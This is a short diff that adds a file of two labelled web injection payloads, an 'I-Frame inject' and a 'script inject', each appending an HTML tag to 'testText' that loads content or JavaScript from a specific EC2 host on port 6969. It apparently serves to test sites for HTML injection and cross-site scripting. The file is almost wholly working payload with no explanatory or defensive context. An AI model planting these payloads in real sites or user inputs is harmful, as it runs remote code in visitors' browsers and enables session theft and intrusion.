@@ -1,0 +1,5 @@
+I-Frame inject
+testText<iframe src="https://ec2-13-56-20-200.us-west-1.compute.amazonaws.com:6969/html"></iframe>
+
+script inject
+testText<script src="https://ec2-13-56-20-200.us-west-1.compute.amazonaws.com:6969/js"></script>
